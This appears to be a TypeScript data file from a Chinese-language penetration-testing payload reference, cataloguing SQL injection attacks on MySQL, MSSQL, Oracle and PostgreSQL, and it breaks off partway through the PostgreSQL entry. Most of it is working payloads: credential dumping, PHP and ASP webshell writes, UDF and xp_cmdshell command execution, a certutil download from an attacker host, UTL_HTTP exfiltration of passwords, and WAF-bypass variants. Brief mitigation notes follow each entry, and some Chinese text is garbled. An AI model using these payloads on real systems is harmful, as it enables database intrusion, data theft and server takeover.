import type { PayloadItem } from '../types';

export const webPayloads: PayloadItem[] = [
  {
    id: 'sqli-mysql-basic',
    name: 'MySQL注入 - 基础探测',
    description: 'MySQL数据库注入基础探测与数据提取技术',
    category: 'SQL/NoSQL注入',
    subCategory: 'MySQL',
    tags: ['sqli', 'mysql', 'injection', 'database'],
    prerequisites: ['目标存在SQL注入点', '后端数据库为MySQL', '了解基本SQL语法'],
    execution: [
      { 
        title: '1. 探测注入点', 
        command: "' OR '1'='1\n' OR 1=1--\n1' AND '1'='1\n1' AND '1'='2", 
        description: '使用单引号和布尔条件探测是否存在注入点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '\' OR \'1\'=\'1\n\' OR 1=1--\n1\' AN', explanation: '探测载荷', type: 'value' },
          { part: 'OR', explanation: '关键参数', type: 'value' },
          { part: '\'1\'', explanation: '关键参数', type: 'value' },
          { part: '\'1\n\'', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '2. 确定列数', 
        command: "' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--\n�到报错确定列数\n或使用:\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT NULL,NULL,NULL--", 
        description: '使用ORDER BY或UNION SELECT NULL确定查询列数', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'ORDER BY', explanation: '按指定列排序' },
          { part: 'NULL', explanation: '空值占位符' }
        ]
      },
      { 
        title: '3. 确定显示位置', 
        command: "' UNION SELECT 1,2,3--\n' UNION SELECT 'a','b','c'--", 
        description: '找出哪些列会显示在页面上', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION SELECT', explanation: '联合查询，合并结果集' },
          { part: '1,2,3', explanation: '数字标记显示位置' }
        ]
      },
      { 
        title: '4. 获取数据库信息', 
        command: "' UNION SELECT 1,database(),3--\n' UNION SELECT 1,user(),3--\n' UNION SELECT 1,version(),3--\n' UNION SELECT 1,@@hostname,3--", 
        description: '获取当前数据库名、用户、版本等基础信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'database()', explanation: '返回当前数据库名' },
          { part: 'user()', explanation: '返回当前用户' },
          { part: 'version()', explanation: '返回MySQL版本' }
        ]
      },
      { 
        title: '5. 枚举所有数据库', 
        command: "' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--\n' UNION SELECT schema_name,2,3 FROM information_schema.schemata LIMIT 0,1--", 
        description: '获取MySQL服务器上所有数据库名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'information_schema', explanation: 'MySQL系统数据库，存储元数据' },
          { part: 'schemata', explanation: '存储所有数据库名的表' },
          { part: 'group_concat()', explanation: '将多行合并为一行' }
        ]
      },
      { 
        title: '6. 枚举表名', 
        command: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--\n' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='target_db' LIMIT 0,1--", 
        description: '获取指定数据库中的所有表名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'information_schema.tables', explanation: '存储所有表信息的系统表' },
          { part: 'table_schema', explanation: '表所属的数据库名' },
          { part: 'table_name', explanation: '表名' }
        ]
      },
      { 
        title: '7. 枚举列名', 
        command: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--\n' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' AND table_schema=database() LIMIT 0,1--", 
        description: '获取指定表的所有列名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'information_schema.columns', explanation: '存储所有列信息的系统表' },
          { part: 'column_name', explanation: '列名' }
        ]
      },
      { 
        title: '8. 提取数据', 
        command: "' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--\n' UNION SELECT username,password,3 FROM users LIMIT 0,1--", 
        description: '从目标表中提取敏感数据', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '0x3a', explanation: '冒号的十六进制，用于分隔符' },
          { part: 'LIMIT 0,1', explanation: '限制返回第一行结果' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '大小写混淆', 
        command: "' UnIoN SeLeCt 1,database(),3--\n' uNiOn SeLeCt 1,user(),3--", 
        description: '使用大小写混合绕过关键字过滤', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UnIoN SeLeCt', explanation: '混合大小写绕过简单关键字匹配' }
        ]
      },
      { 
        title: '内联注释', 
        command: "' /*!UNION*/ /*!SELECT*/ 1,database(),3--\n' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", 
        description: '使用MySQL特有内联注释绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '/*!UNION*/', explanation: 'MySQL会执行注释内的SQL' },
          { part: '/*!50000', explanation: '指定MySQL版本5.00.00以上执行' }
        ]
      },
      { 
        title: '双写绕过', 
        command: "' UNUNIONION SELSELECTECT 1,database(),3--\n' UNIunionON SELselectECT 1,2,3--", 
        description: '双写关键字绕过替换过滤', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNUNIONION', explanation: 'WAF删除UNION后变成UNION' },
          { part: 'SELSELECTECT', explanation: 'WAF删除SELECT后变成SELECT' }
        ]
      },
      { 
        title: '空格替代', 
        command: "'/**/UNION/**/SELECT/**/1,database(),3--\n' %0aUNION%0aSELECT%0a1,2,3--\n'(UNION(SELECT(1),(database()),(3)))--", 
        description: '使用注释、换行、括号替代空格', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '/**/', explanation: '注释替代空格' },
          { part: '%0a', explanation: '换行符URL编码' },
          { part: '()', explanation: '括号包裹替代空格' }
        ]
      },
      { 
        title: '编码绕过', 
        command: "' UNION SELECT 1,hex(database()),3--\n' UNION SELECT 1,unhex(hex(database())),3--\n' UNION SELECT 1,conv(hex(database()),16,10),3--", 
        description: '使用编码函数绕过关键字检测', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'hex()', explanation: '十六进制编码' },
          { part: 'unhex()', explanation: '十六进制解码' },
          { part: 'conv()', explanation: '进制转换' }
        ]
      }
    ],
    tutorial: {
      overview: 'MySQL注入是最常见的数据库注入类型，通过构造恶意SQL语句获取或修改数据库数据。攻击者可以利用注入漏�读取敏感数据、写入WebShell甚至执行系统命令。',
      vulnerability: '应用程序未对用户输入进行充分过滤，�接拼接到SQL语句中执行。常见于搜�框、登录表单、URL参数等输入点。',
      exploitation: '完�利用流程：\n1. 探测注入点：使用单引号、布尔条件确认是否存在注入\n2. 确定列数：使用ORDER BY或UNION SELECT NULL\n3. 确定显示位置：找出哪些列会回显到页面\n4. 获取数据库信息：database()、user()、version()\n5. 枚举数据库结构：information_schema库\n6. 提取敏感数据：用户名、密码等\n7. 尝试提权：文件读写、UDF提权',
      mitigation: '防御措施：\n1. 使用参数化查询(PDO、预处理语句)\n2. 输入验证和白名单过滤\n3. 最小权限原则，限制数据库用户权限\n4. 禁用或限制FILE权限\n5. 设置secure_file_priv为NULL\n6. 部署WAF防护\n7. 错误信息不�露数据库详情',
      difficulty: 'beginner'
    }
  },
  {
    id: 'sqli-mysql-advanced',
    name: 'MySQL注入 - 高级技术',
    description: 'MySQL高级注入技术：文件读写、UDF提权、命令执行',
    category: 'SQL/NoSQL注入',
    subCategory: 'MySQL',
    tags: ['sqli', 'mysql', 'advanced', 'file-read', 'rce'],
    prerequisites: ['MySQL用户具有FILE权限', '知道网站绝对路径', 'secure_file_priv配置允许'],
    execution: [
      { 
        title: '1. 检测FILE权限', 
        command: "' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user=current_user()--\n' AND (SELECT file_priv FROM mysql.user WHERE user=current_user())='Y'--", 
        description: '检测当前用户是否有FILE权限', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'mysql.user', explanation: 'MySQL用户权限表' },
          { part: 'file_priv', explanation: 'FILE权限字段' },
          { part: 'current_user()', explanation: '返回当前用户' }
        ]
      },
      { 
        title: '2. 获取网站路径', 
        command: "' UNION SELECT 1,@@basedir,3--\n' UNION SELECT 1,@@datadir,3--\n' UNION SELECT 1,load_file('/etc/passwd'),3--", 
        description: '通过错误信息或读取文件获取网站路径', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '@@basedir', explanation: 'MySQL安装目录' },
          { part: '@@datadir', explanation: 'MySQL数据目录' }
        ]
      },
      { 
        title: '3. 读取敏感文件', 
        command: "' UNION SELECT 1,load_file('/etc/passwd'),3--\n' UNION SELECT 1,load_file('/var/www/html/config.php'),3--\n' UNION SELECT 1,load_file('C:/windows/win.ini'),3--", 
        description: '使用load_file读取系统敏感文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'load_file()', explanation: 'MySQL读取文件函数' },
          { part: '/etc/passwd', explanation: 'Linux用户信息文件' }
        ]
      },
      { 
        title: '4. 写入WebShell', 
        command: "' UNION SELECT 1,'<?php @eval($_POST[cmd]);?>',3 INTO OUTFILE '/var/www/html/shell.php'--\n' UNION SELECT 1,'<?php system($_GET[c]);?>',3 INTO OUTFILE '/var/www/html/cmd.php'--", 
        description: '使用INTO OUTFILE写入WebShell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: '--', explanation: 'SQL单行注释', type: 'operator' }
        ]
      },
      { 
        title: '5. 日志写Shell', 
        command: "SET GLOBAL general_log='ON';\nSET GLOBAL general_log_file='/var/www/html/shell.php';\nSELECT '<?php @eval($_POST[cmd]);?>';", 
        description: '通过开启general_log写入Shell', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'general_log', explanation: 'MySQL通用查询日志开关' },
          { part: 'general_log_file', explanation: '日志文件路径' }
        ]
      },
      { 
        title: '6. UDF提权', 
        command: "SELECT load_file('/tmp/lib_mysqludf_sys.so') INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';\nCREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';\nSELECT sys_eval('id');", 
        description: '使用UDF提权执行系统命令', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'INTO DUMPFILE', explanation: '写入二进制文件' },
          { part: 'CREATE FUNCTION', explanation: '创建自定义函数' },
          { part: 'sys_eval', explanation: '执行系统命令的UDF函数' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'Hex编码写入', 
        command: "' UNION SELECT 1,0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e,3 INTO DUMPFILE '/var/www/html/shell.php'--", 
        description: '使用十六进制编码绕过关键字检测', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: '0x3c3f706870...', explanation: 'PHP一句话的十六进制编码' },
          { part: 'INTO DUMPFILE', explanation: '写入二进制文件' }
        ]
      },
      { 
        title: 'Char编码绕过', 
        command: "' UNION SELECT 1,CHAR(60,63,112,104,112,32,64,101,118,97,108,40,36,95,80,79,83,84,91,99,109,100,93,41,59,63,62),3 INTO OUTFILE '/var/www/html/s.php'--", 
        description: '使用CHAR函数编码绕过', 
        platform: 'linux',
        syntaxBreakdown: [
          { part: 'CHAR(60,63...)', explanation: '使用ASCII码值构造字符串' }
        ]
      }
    ],
    tutorial: {
      overview: 'MySQL高级注入技术可以实现文件读取、WebShell写入甚至系统命令执行。这些技术需要较高的数据库权限和特定的配置条件。',
      vulnerability: 'MySQL的FILE权限允许读写文件，配合secure_file_priv配置不当可导�严重后果。UDF提权可以执行任意系统命令。',
      exploitation: '完�利用流程：\n1. 检测FILE权限和secure_file_priv配置\n2. 获取网站绝对路径\n3. 使用load_file读取敏感配置\n4. 使用INTO OUTFILE写入WebShell\n5. 如果OUTFILE被禁，使用日志写Shell\n6. 尝试UDF提权获取系统Shell',
      mitigation: '防御措施：\n1. 限制FILE权限，不给Web应用用户\n2. 设置secure_file_priv=NULL禁止文件操作\n3. 禁用INTO OUTFILE和INTO DUMPFILE\n4. 使用AppArmor/SELinux限制MySQL文件访问\n5. 监控异常的文件读写操作',
      difficulty: 'advanced'
    }
  },
  {
    id: 'sqli-mssql-basic',
    name: 'MSSQL注入 - 基础探测',
    description: 'Microsoft SQL Server数据库注入技术',
    category: 'SQL/NoSQL注入',
    subCategory: 'MSSQL',
    tags: ['sqli', 'mssql', 'sqlserver', 'injection'],
    prerequisites: ['目标存在SQL注入点', '后端使用MSSQL数据库'],
    execution: [
      { 
        title: '1. 探测注入点', 
        command: "' OR 1=1--\n' OR '1'='1\n1' AND 1=1--\n1' AND 1=2--", 
        description: '基础注入探测', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '--', explanation: 'MSSQL单行注释符' },
          { part: 'OR 1=1', explanation: '永真条件' }
        ]
      },
      { 
        title: '2. 获取版本信息', 
        command: "' UNION SELECT 1,@@version,3--\n' UNION SELECT 1,SERVERPROPERTY('Edition'),3--\n' UNION SELECT 1,SERVERPROPERTY('ProductVersion'),3--", 
        description: '获取MSSQL版本信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '@@version', explanation: '返回SQL Server版本' },
          { part: 'SERVERPROPERTY()', explanation: '返回服务器属性信息' }
        ]
      },
      { 
        title: '3. 获取用户信息', 
        command: "' UNION SELECT 1,user_name(),3--\n' UNION SELECT 1,suser_name(),3--\n' UNION SELECT 1,system_user,3--\n' UNION SELECT 1,is_srvrolemember('sysadmin'),3--", 
        description: '获取当前用户及权限信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'user_name()', explanation: '返回当前数据库用户' },
          { part: 'suser_name()', explanation: '返回登录名' },
          { part: 'is_srvrolemember()', explanation: '检查是否属于服务器角色' }
        ]
      },
      { 
        title: '4. 获取数据库信息', 
        command: "' UNION SELECT 1,db_name(),3--\n' UNION SELECT 1,db_name(0),3--\n' UNION SELECT 1,db_name(1),3--\n' UNION SELECT name,2,3 FROM master..sysdatabases--", 
        description: '获取所有数据库名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'db_name()', explanation: '返回当前数据库名' },
          { part: 'db_name(N)', explanation: '返回第N个数据库名' },
          { part: 'master..sysdatabases', explanation: '系统数据库，存储所有库信息' }
        ]
      },
      { 
        title: '5. 获取表名', 
        command: "' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--\n' UNION SELECT 1,name,3 FROM sys.tables--\n' UNION SELECT 1,table_name,3 FROM information_schema.tables--", 
        description: '获取用户表名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UNION', explanation: '合并查询结果集', type: 'keyword' },
          { part: 'SELECT', explanation: '查询数据', type: 'keyword' },
          { part: 'FROM sysobjects', explanation: '指定数据表', type: 'value' },
          { part: 'WHERE', explanation: '条件过滤', type: 'keyword' }
        ]
      },
      { 
        title: '6. 获取列名', 
        command: "' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--\n' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--", 
        description: '获取指定表的列名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'syscolumns', explanation: '系统列信息表' },
          { part: 'information_schema.columns', explanation: '标准信息模式视图' }
        ]
      },
      { 
        title: '7. 提取数据', 
        command: "' UNION SELECT 1,username+':'+password,3 FROM users--\n' UNION SELECT TOP 1 username,password,3 FROM users--", 
        description: '提取表中的数据', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '+', explanation: 'MSSQL字符串连接符' },
          { part: 'TOP 1', explanation: '返回第一条记录' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'Hex编码', 
        command: "' UNION SELECT 1,master.dbo.fn_varbintohexstr(CAST(username AS VARBINARY)),3 FROM users--", 
        description: '使用Hex编码绕过', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'fn_varbintohexstr()', explanation: '转换为十六进制字符串' }
        ]
      },
      { 
        title: '注释绕过', 
        command: "'/**/UNION/**/SELECT/**/1,2,3--\n' UN%00ION SELECT 1,2,3--", 
        description: '使用注释和空字节绕过', 
        platform: 'all'
      }
    ],
    tutorial: {
      overview: 'MSSQL注入与MySQL类似，但语法和系统表有所不同。MSSQL提供了�多强大的存储过程，可以执行系统命令。',
      vulnerability: '应用程序未对用户输入进行充分过滤，�接拼接到SQL语句中执行。MSSQL特有的存储过程增加了攻击面。',
      exploitation: '完�利用流程：\n1. 探测注入点类型\n2. 获取版本和用户信息\n3. 枚举数据库结构\n4. 提取敏感数据\n5. 尝试使用xp_cmdshell执行命令',
      mitigation: '防御措施：\n1. 使用参数化查询\n2. 最小权限原则\n3. 禁用xp_cmdshell等危险存储过程\n4. 使用存储过程封装业务逻辑',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-mssql-advanced',
    name: 'MSSQL注入 - 高级技术',
    description: 'MSSQL高级注入：xp_cmdshell、SP_OACREATE命令执行',
    category: 'SQL/NoSQL注入',
    subCategory: 'MSSQL',
    tags: ['sqli', 'mssql', 'xp_cmdshell', 'rce'],
    prerequisites: ['MSSQL具有高权限', 'xp_cmdshell可用或可开启'],
    execution: [
      { 
        title: '1. 检测xp_cmdshell状态', 
        command: "' UNION SELECT 1,OBJECT_ID('xp_cmdshell'),3--\n'; EXEC master..xp_cmdshell 'whoami'--", 
        description: '检测xp_cmdshell是否可用', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'OBJECT_ID()', explanation: '检查对象是否存在' },
          { part: 'xp_cmdshell', explanation: '执行系统命令的扩展存储过程' }
        ]
      },
      { 
        title: '2. 开启xp_cmdshell', 
        command: "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--", 
        description: '如果xp_cmdshell被禁用，尝试开启', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: '\';', explanation: '关键参数', type: 'value' },
          { part: 'EXEC', explanation: '关键参数', type: 'value' },
          { part: 'sp_configure', explanation: '关键参数', type: 'value' }
        ]
      },
      { 
        title: '3. 执行系统命令', 
        command: "'; EXEC master..xp_cmdshell 'whoami'--\n'; EXEC master..xp_cmdshell 'net user'--\n'; EXEC master..xp_cmdshell 'dir C:\\'--", 
        description: '使用xp_cmdshell执行系统命令', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'master..xp_cmdshell', explanation: '调用master数据库中的xp_cmdshell' }
        ]
      },
      { 
        title: '4. 写入WebShell', 
        command: "'; EXEC master..xp_cmdshell 'echo ^<%execute(request(\"cmd\"))^> > C:\\inetpub\\wwwroot\\shell.asp'--\n'; EXEC master..xp_cmdshell 'certutil -urlcache -split -f http://attacker/shell.aspx C:\\inetpub\\wwwroot\\shell.aspx'--", 
        description: '写入或下载WebShell', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'echo', explanation: '写入文件内容' },
          { part: 'certutil', explanation: 'Windows内置下载工具' }
        ]
      },
      { 
        title: '5. SP_OACREATE方法', 
        command: "'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;\nDECLARE @shell INT;\nEXEC SP_OACREATE 'wscript.shell', @shell OUTPUT;\nEXEC SP_OAMETHOD @shell, 'run', NULL, 'cmd /c whoami > C:\\output.txt';--", 
        description: '使用SP_OACREATE执行命令', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'SP_OACREATE', explanation: '创建OLE自动化对象' },
          { part: 'wscript.shell', explanation: 'Windows脚本宿主对象' },
          { part: 'SP_OAMETHOD', explanation: '调用对象方法' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: '堆叠查询', 
        command: "'; EXEC('EXEC master..xp_cmdshell ''whoami''')--\n'; DECLARE @cmd VARCHAR(255); SET @cmd='whoami'; EXEC master..xp_cmdshell @cmd;--", 
        description: '使用动态SQL绕过', 
        platform: 'windows',
        syntaxBreakdown: [
          { part: 'EXEC()', explanation: '执行动态SQL' },
          { part: 'DECLARE', explanation: '声明变量' }
        ]
      }
    ],
    tutorial: {
      overview: 'MSSQL高级注入利用xp_cmdshell和SP_OACREATE等存储过程可以执行系统命令，实现完全控制服务器。',
      vulnerability: 'MSSQL高级注入利用数据库特有功能如xp_cmdshell存储过程执行系统命令、OPENROWSET进行带外数据外泄、利用堆叠查询执行多条SQL语句。MSSQL的错误信息通常较为详细，可通过错误注入提取数据库版本、表结构等敏感信息。',
      exploitation: '完�利用流程：\n1. 检测当前用户权限\n2. 尝试开启xp_cmdshell\n3. 执行系统命令\n4. 写入WebShell或添加用户\n5. 如果xp_cmdshell被禁，尝试SP_OACREATE',
      mitigation: '防御措施：\n1. 禁用xp_cmdshell和Ole Automation Procedures\n2. 使用最小权限�户\n3. 使用存储过程封装业务逻辑\n4. 部署WAF防护',
      difficulty: 'advanced'
    }
  },
  {
    id: 'sqli-oracle-basic',
    name: 'Oracle注入 - 基础探测',
    description: 'Oracle数据库注入基础技术',
    category: 'SQL/NoSQL注入',
    subCategory: 'Oracle',
    tags: ['sqli', 'oracle', 'injection'],
    prerequisites: ['目标存在SQL注入点', '后端使用Oracle数据库'],
    execution: [
      { 
        title: '1. 探测注入点', 
        command: "' OR 1=1--\n' OR '1'='1\n' UNION SELECT NULL,NULL,NULL FROM DUAL--", 
        description: '探测注入点类型', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'FROM DUAL', explanation: 'Oracle虚拟表，SELECT必须有FROM' },
          { part: 'NULL,NULL,NULL', explanation: '探测列数' }
        ]
      },
      { 
        title: '2. 获取版本信息', 
        command: "' UNION SELECT banner,NULL FROM v$version WHERE rownum=1--\n' UNION SELECT version,NULL FROM v$instance--", 
        description: '获取Oracle版本', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'v$version', explanation: 'Oracle版本信息视图' },
          { part: 'v$instance', explanation: '实例信息视图' },
          { part: 'rownum=1', explanation: '限制返回一行' }
        ]
      },
      { 
        title: '3. 获取用户信息', 
        command: "' UNION SELECT username,NULL FROM all_users--\n' UNION SELECT user,NULL FROM DUAL--\n' UNION SELECT SYS_CONTEXT('USERENV','SESSION_USER'),NULL FROM DUAL--", 
        description: '获取数据库用户', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'all_users', explanation: '所有用户视图' },
          { part: 'user', explanation: '当前用户' },
          { part: 'SYS_CONTEXT', explanation: '获取会话上下文信息' }
        ]
      },
      { 
        title: '4. 获取表名', 
        command: "' UNION SELECT table_name,NULL FROM all_tables WHERE owner='SCOTT'--\n' UNION SELECT owner||'.'||table_name,NULL FROM all_tables--", 
        description: '获取表名', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'all_tables', explanation: '所有表视图' },
          { part: 'owner', explanation: '表所属用户' },
          { part: '||', explanation: 'Oracle字符串连接符' }
        ]
      },
      { 
        title: '5. 获取列名', 
        command: "' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--\n' UNION SELECT column_name||':'||data_type,NULL FROM all_tab_columns WHERE table_name='USERS'--", 
        description: '获取列名和数据类型', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'all_tab_columns', explanation: '所有列信息视图' },
          { part: 'data_type', explanation: '列数据类型' }
        ]
      },
      { 
        title: '6. 提取数据', 
        command: "' UNION SELECT username||':'||password,NULL FROM users--\n' UNION SELECT * FROM (SELECT username,password FROM users) WHERE rownum<=1--", 
        description: '提取表数据', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'rownum<=1', explanation: 'Oracle分页方式' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'UTL_HTTP外带', 
        command: "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE rownum=1)),NULL FROM DUAL--", 
        description: '使用UTL_HTTP外带数据', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UTL_HTTP.REQUEST()', explanation: '发起HTTP请求' }
        ]
      }
    ],
    tutorial: {
      overview: 'Oracle数据库注入需要掌握特有的语法和系统视图。Oracle提供了丰富的内置包可以实现�多功能。',
      vulnerability: 'Oracle数据库注入的特殊性在于其严格的语法要求：SELECT必须带FROM子句(可用dual伪表)、字符串连接使用||运算符、注释使用--而非#。Oracle的数据字典(all_tables/all_tab_columns)是信息枚举的关键入口。',
      exploitation: '完�利用流程：\n1. 探测注入点和列数\n2. 获取数据库版本和用户\n3. 枚举表和列\n4. 提取敏感数据\n5. 尝试使用UTL_HTTP等包外带数据',
      mitigation: '防御措施：\n1. 使用参数化查询\n2. 最小权限原则\n3. 禁用危险包如UTL_HTTP\n4. 使用DBMS_ASSERT验证输入',
      difficulty: 'intermediate'
    }
  },
  {
    id: 'sqli-oracle-advanced',
    name: 'Oracle注入 - 高级技术',
    description: 'Oracle高级注入技术：Java存储过程、UTL_FILE文件操作',
    category: 'SQL/NoSQL注入',
    subCategory: 'Oracle',
    tags: ['sqli', 'oracle', 'advanced', 'rce'],
    prerequisites: ['Oracle高权限', 'Java虚拟机可用'],
    execution: [
      { 
        title: '1. 检测Java权限', 
        command: `' UNION SELECT 1,CASE WHEN DBMS_JAVA.TEST_OUTPUT('test') IS NOT NULL THEN 'YES' ELSE 'NO' END FROM DUAL--`, 
        description: '检测Java存储过程是否可用', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'DBMS_JAVA', explanation: 'Oracle Java包' },
          { part: 'TEST_OUTPUT', explanation: '测试Java功能' }
        ]
      },
      { 
        title: '2. 创建Java执行函数', 
        command: `' UNION SELECT 1,(SELECT DBMS_JAVA.RUNJAVA('java.lang.Runtime.exec("cmd /c whoami")') FROM DUAL)--`, 
        description: '使用Java执行系统命令', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'DBMS_JAVA.RUNJAVA', explanation: '执行Java代码' },
          { part: 'Runtime.exec', explanation: 'Java执行系统命令' }
        ]
      },
      { 
        title: '3. UTL_FILE读取文件', 
        command: `' UNION SELECT 1,UTL_FILE.FGETATTR('DATA_PUMP_DIR','/etc/passwd','file_exists') FROM DUAL--`, 
        description: '使用UTL_FILE操作文件', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'UTL_FILE', explanation: 'Oracle文件操作包' },
          { part: 'DATA_PUMP_DIR', explanation: 'Oracle目录对象' }
        ]
      }
    ],
    wafBypass: [
      { 
        title: 'Oracle特有函数绕过', 
        command: `' UNION SELECT 1,XMLType('<root>'||CHR(60)||'data'||CHR(62)||user||'</data></root>') FROM DUAL--
' UNION SELECT 1,DBMS_PIPE.PACK_MESSAGE(user)||DBMS_PIPE.SEND_MESSAGE('pipe1') FROM DUAL--
' UNION SELECT 1,CASE WHEN (SELECT user FROM DUAL)='SYS' THEN 'admin' ELSE 'user' END FROM DUAL--`, 
        description: '使用Oracle XMLType、DBMS_PIPE、CASE表达式等特有函数绕过WAF关键字检测', 
        syntaxBreakdown: [
          { part: 'XMLType()', explanation: 'XML函数构造查询，绕过SELECT过滤' },
          { part: 'DBMS_PIPE', explanation: '管道通信包，替代直接输出' },
          { part: 'CASE WHEN', explanation: '条件表达式替代IF函数' }
        ]
      },
      { 
        title: 'Oracle注释与编码绕过', 
        command: `' UNION/**/SELECT/**/1,user/**/FROM/**/DUAL--
' UNION SELECT 1,CHR(65)||CHR(68)||CHR(77)||CHR(73)||CHR(78) FROM DUAL--
' UNION SELECT 1,RAWTOHEX(user) FROM DUAL--
' UNION SELECT 1,UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW(user))) FROM DUAL--`, 
        description: '使用注释符替代空格、CHR()编码字符串、RAWTOHEX/UTL_ENCODE进行数据编码绕过', 
        syntaxBreakdown: [
          { part: 'CHR()||CHR()', explanation: '逐字符拼接绕过字符串检测' },
          { part: 'RAWTOHEX()', explanation: '将数据转为十六进制绕过内容检测' },
          { part: 'UTL_ENCODE.BASE64_ENCODE', explanation: 'Base64编码数据' }
        ]
      }
    ],
    tutorial: {
      overview: 'Oracle高级注入技术利用PL/SQL块、UTL_HTTP进行带外通信、DBMS_PIPE实现延时注入、XMLType进行报错注入等Oracle特有功能进行深度利用。',
      vulnerability: 'Oracle高级漏洞包括：通过UTL_HTTP/UTL_INADDR进行DNS带外数据外泄，利用DBMS_XMLGEN构造报错回显，PL/SQL注入绕过单语句限制，以及Java存储过程提权执行系统命令。',
      exploitation: '完�利用流程：\n1. 检测Java权限\n2. 使用DBMS_JAVA执行命令\n3. 或使用UTL_FILE读写文件',
      mitigation: '防御Oracle高级注入需要：限制数据库用户权限(撤销UTL_HTTP、DBMS_XMLGEN等包的EXECUTE权限)，启用Oracle审计功能，使用绑定变量而非字符串拼接，配置网络ACL限制出站连接。',
      difficulty: 'advanced'
    }
  },
  {
    id: 'sqli-postgres-basic',
    name: 'PostgreSQL注入 - 基础探测',
    description: 'PostgreSQL数据库注入技术',
    category: 'SQL/NoSQL注入',
    subCategory: 'PostgreSQL',
    tags: ['sqli', 'postgresql', 'postgres', 'injection'],
    prerequisites: ['目标存在SQL注入点', '后端使用PostgreSQL'],
    execution: [
      { 
        title: '1. 探测注入点', 
        command: "' OR 1=1--\n' OR '1'='1\n' UNION SELECT NULL,NULL,NULL--", 
        description: '探测注入点', 
        platform: 'all',
        syntaxBreakdown: [
          { part: '--', explanation: 'PostgreSQL注释符' }
        ]
      },
      { 
        title: '2. 获取版本信息', 
        command: "' UNION SELECT version(),NULL--\n' UNION SELECT current_database(),NULL--\n' UNION SELECT current_user,NULL--", 
        description: '获取数据库信息', 
        platform: 'all',
        syntaxBreakdown: [
          { part: 'version()', explanation: 'PostgreSQL版本' },
          { part: 'current_database()', explanation: '当前数据库' },
          { part: 'current_user', explanation: '当前用户' }
        ]
      },
      { 
        title: '3. 获取表名', 
        command: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--", 
        description: '获取public模式下的表', 
        platform: 'all',
        syntaxBreakdown: [
